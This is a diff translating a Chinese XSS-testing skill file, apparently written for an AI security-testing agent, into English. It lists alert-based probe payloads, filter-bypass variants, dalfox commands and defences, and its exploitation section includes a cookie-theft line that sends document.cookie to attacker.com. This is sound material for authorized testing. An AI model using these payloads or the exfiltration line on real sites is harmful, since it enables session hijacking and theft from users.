@@ -1,35 +1,35 @@
 ---
 name: xss-testing
-description: XSS跨站脚本攻击测试的专业技能
+description: Professional skills for XSS (Cross-Site Scripting) testing
 version: 1.0.0
 ---
 
-# XSS测试技能
+# XSS Testing Skill
 
-## 概述
+## Overview
 
-跨站脚本攻击(XSS)允许攻击者在受害者的浏览器中执行恶意JavaScript代码。本技能涵盖反射型、存储型和DOM型XSS的测试方法。
+Cross-Site Scripting (XSS) allows an attacker to execute malicious JavaScript code in a victim's browser. This skill covers testing methods for reflected, stored, and DOM-based XSS.
 
-## XSS类型
+## XSS Types
 
-### 1. 反射型XSS (Reflected XSS)
-- 恶意脚本通过URL参数传递
-- 服务器直接返回包含脚本的响应
-- 需要用户点击恶意链接
+### 1. Reflected XSS
+- The malicious script is passed via a URL parameter
+- The server directly returns a response containing the script
+- Requires the user to click a malicious link
 
-### 2. 存储型XSS (Stored XSS)
-- 恶意脚本存储在服务器（数据库、文件等）
-- 所有访问受影响页面的用户都会执行脚本
-- 影响范围更大
+### 2. Stored XSS
+- The malicious script is stored on the server (database, files, etc.)
+- All users who visit the affected page execute the script
+- Broader scope of impact
 
-### 3. DOM型XSS (DOM-based XSS)
-- 客户端JavaScript处理用户输入不当
-- 不涉及服务器端处理
-- 通过修改DOM结构触发
+### 3. DOM-based XSS
+- Client-side JavaScript handles user input improperly
+- Does not involve server-side processing
+- Triggered by modifying the DOM structure
 
-## 测试方法
+## Testing Methodology
 
-### 基础Payload
+### Basic Payloads
 ```javascript
 <script>alert('XSS')</script>
 <img src=x onerror=alert('XSS')>
@@ -37,100 +37,100 @@ version: 1.0.0
 <body onload=alert('XSS')>
 ```
 
-### 绕过过滤
+### Filter Bypass
 
-#### 大小写绕过
+#### Case bypass
 ```javascript
 <ScRiPt>alert('XSS')</ScRiPt>
 ```
 
-#### 编码绕过
+#### Encoding bypass
 ```javascript
 %3Cscript%3Ealert('XSS')%3C/script%3E
 &#60;script&#62;alert('XSS')&#60;/script&#62;
 ```
 
-#### 事件处理器
+#### Event handlers
 ```javascript
 <img src=x onerror=alert(String.fromCharCode(88,83,83))>
 <div onmouseover=alert('XSS')>hover</div>
 <input onfocus=alert('XSS') autofocus>
 ```
 
-#### 伪协议
+#### Pseudo-protocols
 ```javascript
 <a href="javascript:alert('XSS')">click</a>
 <iframe src="javascript:alert('XSS')">
 ```
 
-### 高级绕过技术
+### Advanced Bypass Techniques
 
-#### 使用String.fromCharCode
+#### Using String.fromCharCode
 ```javascript
 <script>alert(String.fromCharCode(88,83,83))</script>
 ```
 
-#### 使用eval和atob
+#### Using eval and atob
 ```javascript
 <script>eval(atob('YWxlcnQoJ1hTUycp'))</script>
 ```
 
-#### 使用HTML实体
+#### Using HTML entities
 ```javascript
 &#60;script&#62;alert('XSS')&#60;/script&#62;
 ```
 
-## 工具使用
+## Tool Usage
 
 ### dalfox
 ```bash
-# 基础扫描
+# Basic scan
 dalfox url "http://target.com/page?q=test"
 
-# 指定参数
+# Specify parameter
 dalfox url "http://target.com/page" -d "q=test" -X POST
 
-# 使用自定义payload
+# Use a custom payload
 dalfox url "http://target.com/page?q=test" --custom-payload payloads.txt
 ```
 
 ### Burp Suite
-- 使用Intruder模块进行批量测试
-- 使用Repeater手动测试
-- 使用Scanner自动检测
+- Use the Intruder module for batch testing
+- Use Repeater for manual testing
+- Use Scanner for automated detection
 
-### 浏览器控制台
-- 测试DOM型XSS
-- 检查JavaScript执行环境
-- 调试payload
+### Browser Console
+- Test DOM-based XSS
+- Inspect the JavaScript execution environment
+- Debug payloads
 
-## 验证和利用
+## Verification and Exploitation
 
-### 验证步骤
-1. 确认payload被执行
-2. 检查是否被过滤或编码
-3. 测试不同上下文（HTML、JavaScript、属性等）
-4. 评估影响（Cookie窃取、会话劫持等）
+### Verification Steps
+1. Confirm that the payload is executed
+2. Check whether it is filtered or encoded
+3. Test different contexts (HTML, JavaScript, attributes, etc.)
+4. Assess the impact (cookie theft, session hijacking, etc.)
 
-### 利用场景
-- Cookie窃取：`<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>`
-- 键盘记录：注入键盘事件监听器
-- 钓鱼攻击：伪造登录表单
-- 会话劫持：获取用户会话token
+### Exploitation Scenarios
+- Cookie theft: `<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>`
+- Keylogging: inject a keyboard event listener
+- Phishing: forge a login form
+- Session hijacking: obtain the user's session token
 
-## 报告要点
+## Reporting Key Points
 
-- XSS类型（反射/存储/DOM）
-- 触发位置和参数
-- 完整的POC
-- 影响评估
-- 修复建议（输出编码、CSP策略等）
-- 确认后通过 `report_finding` 工具将发现录入平台（本平台记录漏洞的唯一入口）
+- XSS type (reflected/stored/DOM)
+- Trigger location and parameter
+- Complete PoC
+- Impact assessment
+- Remediation recommendations (output encoding, CSP policy, etc.)
+- After confirmation, submit the finding to the platform via the `report_finding` tool (the sole entry point for recording vulnerabilities on this platform)
 
-## 防护措施
+## Defensive Measures
 
-- 输入验证和过滤
-- 输出编码（HTML、JavaScript、URL）
+- Input validation and filtering
+- Output encoding (HTML, JavaScript, URL)
 - Content Security Policy (CSP)
-- HttpOnly Cookie标志
-- 使用安全的框架和库
+- HttpOnly cookie flag
+- Use secure frameworks and libraries
